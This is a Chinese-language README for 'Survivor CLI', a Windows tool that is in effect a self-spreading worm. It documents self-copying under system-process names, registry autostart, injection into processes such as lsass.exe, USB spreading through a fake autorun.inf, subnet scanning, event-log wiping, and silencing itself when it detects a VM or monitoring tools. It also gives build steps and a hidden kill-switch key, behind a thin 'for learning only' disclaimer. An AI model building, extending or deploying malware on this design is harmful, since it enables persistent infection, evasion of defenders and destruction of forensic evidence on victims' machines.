# Survivor CLI

一个永不被删除的CLI工具，会自动复制、移动、重命名自己，散布到系统各处，并在后台持续运行自我修复和扩散机制。

**警告：此工具仅供学习和研究使用。作者不对任何滥用行为负责。**

## 功能特性

### 核心能力

| 功能 | 描述 |
|------|------|
| **自复制** | 复制自身到任意指定路径 |
| **自移动** | 将自身移动到新位置并在新位置继续运行 |
| **自重命名** | 伪装成系统文件名（svchost.exe, rundll32.exe等） |
| **自删除/恢复** | 删除当前实例，从其他副本恢复 |
| **环境变量操作** | 添加/移除PATH中的自身目录 |
| **开机自启** | 通过注册表实现启动时运行 |

### 自主行为（后台守护进程模式）

当无参数启动时，会自动运行以下后台线程：

| 线程 | 功能 | 间隔 |
|------|------|------|
| **SpreadingLoop** | 随机复制/移动/重命名到用户目录 | 30s-5min |
| **MonitoringLoop** | 检测副本失踪，立即多点反击恢复 | 500ms |
| **RestorationLoop** | 定期检查并恢复失踪的副本 | 30s |
| **GuardianLoop** | 注入到关键系统进程，监控并重新注入 | 5min |
| **USBScanLoop** | 检测USB插入，自动扩散到U盘 | 5s |
| **CleanupLoop** | 清理日志文件和系统事件日志 | 30min |

### 智能目标选择

扩散时会优先选择以下目录：
- `%USERPROFILE%\Downloads`
- `%USERPROFILE%\Documents`
- `%USERPROFILE%\Desktop`
- `%APPDATA%\Local\Temp`
- `%APPDATA%\Microsoft\Windows`
- `%LOCALAPPDATA%\Microsoft\Windows`
- `%APPDATA%\.cache`
- `%LOCALAPPDATA%\.config`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

### 环境感知

- **VM检测**：在虚拟机中运行时，自动将扩散间隔延长10倍（降低活动频率）
- **监控检测**：检测到Process Hacker、Procmon等工具时，自动进入静默模式（不输出日志）

### 进程注入

支持注入到以下系统进程（隐藏自身）：
- `explorer.exe`
- `svchost.exe`
- `rundll32.exe`
- `csrss.exe`, `smss.exe`, `wininit.exe`, `services.exe`, `lsass.exe`, `winlogon.exe`, `dwm.exe`

### USB自动扩散

- 检测可移动磁盘插入
- 自动复制自身到U盘
- 创建伪装autorun.inf（实际Windows 10+已禁用autoplay，此为社会工程学伪装）

### 网络发现

- 10%概率触发网络扫描
- 探测本地子网（192.168.x.2-19）
- 为未来网络传播做准备

### 日志清理

- 定期删除 `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Windows\Temp` 下的 `.log` 文件
- 1/5概率清空系统和应用程序事件日志

## 命令行接口

### 基础用法

```bash
survivor.exe [command] [arguments]
```

### 可用命令

| 命令 | 描述 | 示例 |
|------|------|------|
| *(无参数)* | 以守护进程模式启动 | `survivor.exe` |
| `copy <path>` | 复制自身到目标路径 | `survivor.exe copy C:\temp\test.exe` |
| `move <path>` | 移动自身到目标路径 | `survivor.exe move D:\tools\survivor.exe` |
| `rename <name>` | 重命名当前实例 | `survivor.exe rename svchost.exe` |
| `hide` | 删除自身，从备份恢复 | `survivor.exe hide` |
| `env --add` | 添加当前目录到PATH | `survivor.exe env --add` |
| `env --remove` | 从PATH移除当前目录 | `survivor.exe env --remove` |
| `plant` | 设置开机自启 | `survivor.exe plant` |
| `status` | 显示当前状态和所有实例 | `survivor.exe status` |
| `summon` | 列出所有已知实例 | `survivor.exe summon` |
| `sync` | 同步所有实例到最新版本 | `survivor.exe sync` |
| `check` | 检查并恢复失踪的实例 | `survivor.exe check` |
| `spread` | 手动触发一次扩散 | `survivor.exe spread` |
| `hide-now` | 紧急隐藏（等同于hide） | `survivor.exe hide-now` |
| `guardian` | 立即注入到关键进程 | `survivor.exe guardian` |
| `--help` | 显示帮助信息 | `survivor.exe --help` |

### 隐藏命令

| 命令 | 描述 | 密钥 |
|------|------|------|
| `ilovecwj <key>` | 紧急后门：删除所有实例 | `cwj_rocks_2026` |

**注意**: `ilovecwj` 命令不会在 `--help` 中显示。

## 构建

### 环境要求

- MinGW g++ 17+
- CMake 3.10+
- Windows SDK

### 编译步骤

```bash
# 创建构建目录
mkdir build
cd build

# 配置CMake
cmake -G "MinGW Makefiles" ..

# 编译
mingw32-make

# 运行
./survivor.exe --help
```

### CMakeLists.txt 依赖

```cmake
target_link_libraries(survivor PRIVATE shell32 advapi32 iphlpapi)
```

## 测试指南

### 重要警告

**强烈建议在隔离环境中测试此工具。** 它会自动扩散并难以完全清除。

### 推荐：虚拟机测试

1. 使用 VirtualBox 或 VMware 创建 Windows 虚拟机
2. 在测试前创建快照
3. 在虚拟机中运行测试
4. 测试完成后还原快照，清除所有痕迹

### 手动测试步骤

#### 1. 基本功能测试

```batch
# 查看帮助
survivor.exe --help

# 查看状态
survivor.exe status

# 复制到临时目录
survivor.exe copy C:\temp\survivor_test.exe
```

#### 2. 移动和重命名测试

```batch
# 在同一目录内测试移动
survivor.exe move C:\temp\renamed_survivor.exe

# 测试重命名
survivor.exe rename rundll32.exe
```

#### 3. 后门命令测试

```batch
# 错误密钥应该失败
survivor.exe ilovecwj wrong_key

# 正确密钥会删除所有实例
survivor.exe ilovecwj cwj_rocks_2026
```

#### 4. 检查注册表（开机自启）

```batch
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor
```

### 清理测试残留

#### 删除所有实例

```batch
# 使用后门
survivor.exe ilovecwj cwj_rocks_2026
```

#### 手动清理注册表

```batch
# 删除开机自启
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f

# 删除环境变量（如果添加了）
reg delete "HKCU\Environment" /v Path
```

#### 清理实例注册文件

```batch
# 删除AppData中的注册表
rmdir /s /q "%APPDATA%\survivor"
```

## 技术细节

### 文件结构

```
C:\code\cli\
├── CMakeLists.txt          # CMake构建配置
├── survivor.cpp            # 源代码（单文件实现）
├── build\
│   └── survivor.exe        # 编译产物
└── docs\
    └── specs\              # 设计文档
```

### 注册表存储

实例列表存储在（XOR加密）：
```
%APPDATA%\survivor\instances.json
```

格式：
```json
{"instances":["C:\\path\\to\\instance1.exe","C:\\path\\to\\instance2.exe"],"last_sync":"2026-04-25T10:30:00Z"}
```

### 全局变量

```cpp
std::atomic<bool> g_running{true};      // 控制后台线程
std::atomic<bool> g_daemon{false};      // 是否守护模式
std::atomic<bool> g_spreading{false};   // 是否扩散中
double g_spread_interval_multiplier = 1.0; // 扩散间隔乘数（VM检测时增加）
bool g_verbose = true;                    // 是否输出日志（监控检测时关闭）
```

### 后台线程架构

```
main()
├── if no args -> StartDaemon()
│   ├── AdjustBehaviorBasedOnEnvironment()  // VM/监控检测
│   ├── RegisterInstance()                  // 注册自身
│   ├── SpreadingLoop()      [独立线程]     // 随机扩散
│   ├── MonitoringLoop()     [独立线程]     // 500ms检测删除
│   ├── RestorationLoop()   [独立线程]     // 30s恢复副本
│   ├── GuardianLoop()      [独立线程]     // 5min进程守护
│   ├── USBScanLoop()       [独立线程]     // 5s检测USB
│   └── CleanupLoop()       [独立线程]     // 30min清理日志
└── else -> 处理命令
```

### 自传播机制

当 `SafeCopy()` 成功复制到新位置时：
1. 立即在新位置设置 `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`
2. 注册新实例到 `instances.json`
3. 如果 `g_spreading` 为true，启动新线程延迟5秒后以 `--daemon` 参数启动新副本

### 反删除机制

`MonitoringLoop()` 每500ms检查一次：
1. 统计 `instances.json` 中有多少实例失踪
2. 如果有实例失踪且自身可访问，立即在5个随机用户目录爆发复制
3. 尝试恢复所有失踪的实例
4. 如果自身失踪，从其他实例重新启动

## 安全说明

### 此工具的能力

- 可以在系统各处创建自身副本
- 可以注入到系统进程
- 可以修改PATH环境变量
- 可以设置开机自启
- 难以被完全清除（有多个副本互相恢复）
- 会在后台持续运行

### 潜在风险

1. **难以删除**: 多个副本互相监控，一个被删其他会恢复
2. **资源占用**: 后台线程会持续消耗CPU和内存
3. **网络活动**: 会进行网络扫描（虽然目前只是探测）
4. **行为可疑**: 被杀毒软件检测

### 使用限制

- **禁止**在生产环境或他人设备上使用
- **禁止**用于任何非法目的
- 此工具仅作为学习Windows系统编程和进程行为的教育目的

## 卸载方法

### 正常卸载

```batch
# 使用后门命令（需要密钥）
survivor.exe ilovecwj cwj_rocks_2026
```

### 手动卸载

```batch
# 1. 停止所有实例（需要找到并逐个删除）

# 2. 删除注册表
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f

# 3. 清理AppData
rmdir /s /q "%APPDATA%\survivor"

# 4. 恢复PATH（如果env --add被使用）
# 需要手动编辑环境变量
```

## 密钥

```
cwj_rocks_2026
```

用于 `ilovecwj` 命令，调用后门删除所有实例。

## 作者信息

学习项目 - 仅供研究Windows系统编程、进程机制、文件系统操作。

## 版本历史

| 版本 | 日期 | 描述 |
|------|------|------|
| 1.0.0 | 2026-04-25 | 初始版本：基础copy/move/rename/plant功能 |
| 2.0.0 | 2026-04-25 | 添加自主行为：后台守护线程、自我修复、智能目标选择 |
| 2.1.0 | 2026-04-25 | 添加进程注入、环境感知、日志清理、网络发现、USB扩散 |

---

**最后更新**: 2026-04-25
**请勿滥用**